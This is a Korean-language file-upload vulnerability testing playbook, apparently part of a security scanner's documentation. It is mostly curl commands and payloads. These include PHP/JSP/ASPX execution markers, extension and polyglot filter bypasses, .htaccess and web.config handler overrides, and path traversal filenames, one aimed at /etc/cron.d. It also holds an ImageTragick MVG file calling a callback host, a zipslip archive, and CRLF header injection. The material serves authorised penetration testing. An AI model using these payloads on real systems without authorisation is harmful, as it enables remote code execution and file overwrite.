### 기본 페이로드

#### 무해 테스트 파일 (확인 마커 포함)
```bash
# HTML (Stored XSS 게이트)
echo '<h1>upload-test-'$(date +%s)'</h1>' > test.html

# PHP (RCE 게이트 — 실행 확인 마커)
echo '<?php echo "PHPTEST_MARK_'$(date +%s)'"; ?>' > test.php

# JSP (Tomcat RCE 게이트)
cat > test.jsp <<'EOF'
<%@ page import="java.util.Date" %>
<%= "JSPTEST_MARK_" + new Date().getTime() %>
EOF

# ASPX (.NET RCE 게이트)
cat > test.aspx <<'EOF'
<%@ Page Language="C#" %>
<%= "ASPXTEST_MARK_" + DateTime.Now.Ticks %>
EOF

# SVG (XSS/SSRF 게이트)
cat > test.svg <<'EOF'
<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>
EOF
```

#### RCE 게이트 페이로드 (확장자 변형)
```bash
# .phtml/.phar/.php5/.php7/.phps/.pht — Apache AddHandler 의존
for ext in phtml phar php5 php7 phps pht; do
  cp test.php "test.$ext"
  curl -X POST "https://target/api/upload" -F "file=@test.$ext"
done

# Polyglot (GIF89a + PHP)
printf 'GIF89a\n<?php echo "POLY_MARK"; ?>' > poly.php.jpg
curl -X POST "https://target/api/upload" -F "file=@poly.php.jpg"

# .htaccess (Apache 환경)
echo 'AddHandler application/x-httpd-php .jpg' > .htaccess
curl -X POST "https://target/api/upload" -F "file=@.htaccess"

# web.config (IIS)
cat > web.config <<'EOF'
<?xml version="1.0"?>
<configuration><system.webServer><handlers>
<add name="x" path="*.jpg" verb="*" type="System.Web.UI.PageHandlerFactory" />
</handlers></system.webServer></configuration>
EOF
curl -X POST "https://target/api/upload" -F "file=@web.config"
```

#### Stored XSS
```bash
# HTML/SVG 업로드 후 inline 렌더 확인
curl -s "https://target/uploads/test.html" -H "Accept: text/html"
# Content-Disposition: inline + text/html이면 XSS 트리거

# SVG는 Playwright로 script 실행 확인
```

**Path Traversal** (`PATH_TRAVERSAL` 라벨):
```bash
# filename에 traversal
curl -X POST "https://target/api/upload" \
  -F "file=@evil.txt;filename=../../etc/cron.d/evil"

curl -X POST "https://target/api/upload" \
  -F 'file=@evil.txt;filename="../../../tmp/out.txt"'

# Windows 변형
curl -X POST "https://target/api/upload" \
  -F 'file=@evil.txt;filename="..\\..\\Windows\\Temp\\evil.txt"'
```

#### 이미지 처리 RCE (ImageMagick/libvips)
```bash
# ImageTragick (CVE-2016-3714)
cat > evil.mvg <<'EOF'
push graphic-context
viewbox 0 0 640 480
fill 'url(https://CALLBACK/imgtragick)'
pop graphic-context
EOF
curl -X POST "https://target/api/upload" -F "file=@evil.mvg"

# SVG에 ImageMagick command (구버전)
cat > evil.svg <<'EOF'
<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <image xlink:href="https://CALLBACK/svg-img"/>
</svg>
EOF

# libwebp CVE-2023-4863 (시험용 WEBP 페이로드 — 별도 도구 필요)
```

#### ZIP 업로드 (zipslip 결합)
```python
import zipfile
z = zipfile.ZipFile('evil.zip', 'w')
z.writestr('../../../tmp/zipslip.txt', 'MARK')
z.close()
```
```bash
curl -X POST "https://target/api/upload" -F "file=@evil.zip"
```

#### 검증 흐름
```bash
# 1. 업로드
curl -X POST "https://target/api/upload" -H "Cookie: session=..." \
  -F "file=@test.php;type=image/jpeg" -v
# 응답에서 파일 URL 추출

# 2. 접근 시도
curl -s "https://target/uploads/<PATH>/test.php"
# PHPTEST_MARK_<timestamp>이 출력되면 RCE 확정
```

---

### 우회 페이로드

| 방어 | 우회 |
|---|---|
| 확장자 블랙리스트 (`.php` 차단) | `.phtml`, `.phar`, `.php5`, `.php7`, `.pht`, `.phps` (Apache AddHandler 의존) |
| 매직바이트 검증만 | Polyglot — `GIF89a\n<?php ...?>` → `.php`로 저장되면 실행 |
| Content-Type 헤더만 | 클라이언트가 `image/jpeg`로 위조 + 내용은 PHP/JSP |
| 첫 청크 매직바이트만 (스트리밍) | 첫 N바이트만 일치 + 이후 청크 악성 |
| 확장자 정규식 `\.(jpg\|png)$` | URL fragment `image.jpg#.php` (특정 reverse proxy), null byte `image.jpg%00.php` |
| ZIP 검증 후 해제 (TOCTOU) | 검증 시점 ZIP과 해제 시점 ZIP 교체 (race) |
| 이미지 재인코딩 (보안 기대) | ImageMagick/libvips/libwebp 자체 RCE (ImageTragick, CVE-2023-4863) |
| 파일명 sanitize | RTL `\u202E` UI 위장, zero-width, Windows ADS `file.jpg::$DATA` |
| MIME sniff 차단 (nosniff) | IE/구 브라우저 잔존 환경에서 여전 sniff |
| 별도 도메인 서빙 | same-site 쿠키면 cookie 탈취 여전 가능 (영향도는 감소) |
| 확장자 substring (마지막 `.` 검사) | `evil.php.jpg` (Apache mod_mime), `evil.jpg.php` 양쪽 시도 |
| 화이트리스트 (jpg/png만) | jpg에 PHP 페이로드 (polyglot) — 일부 환경 해석 |

#### Filename CRLF (Content-Disposition 인젝션)
```bash
curl -X POST "https://target/api/upload" \
  -F "file=@evil.txt;filename=x%0d%0aSet-Cookie:admin=true.txt"
# crlf-injection 결합
```

---

### 참고사항

- RCE 게이트는 `.php`/`.phtml`/`.jsp`/`.aspx`/`.htaccess`/`web.config` 업로드 + 웹 접근 가능
- 프로필 사진, 첨부파일, 리치 에디터 paste, CSV 임포트가 빈출 sink
- 별도 도메인(`usercontent.example.com`)에서 서빙하면 same-origin XSS 차단 (영향도 감소)
- 이미지 재인코딩(sharp/Pillow re-save) 자체는 방어이나 재인코딩 라이브러리 CVE 별도 점검
- 파일명에 CRLF 삽입 → Content-Disposition 인젝션 (crlf-injection과 결합)
- AWS S3 presigned URL은 metadata 헤더 인젝션 가능 — `x-amz-meta-*` CRLF
- 압축 해제 시 symlink 처리는 zipslip-scanner가 담당 — 연계 점검
- Cloud 저장소 ACL도 함께 점검 — private bucket + presigned URL 만료 적용 확인
- 마커 파일에 timestamp 포함 → false positive 회피 (다른 사용자 업로드와 구분)
- Polyglot 파일은 GIF/PNG 헤더 + PHP/JSP 페이로드 — `.php`로 저장되어야 실행
- ImageMagick은 SVG/MVG 입력 자체 RCE (ImageTragick, CVE-2016-3714) — 변환 파이프라인 결합
- libwebp CVE-2023-4863 (Heap buffer overflow) — Chrome/Firefox/모바일 영향
- TOCTOU race는 sandbox에서 어려움 — 응답 시간 분석으로 추정
- HTML5 file API 검증은 클라이언트 — 서버 검증 별도 필수 (multipart 직접 변조)
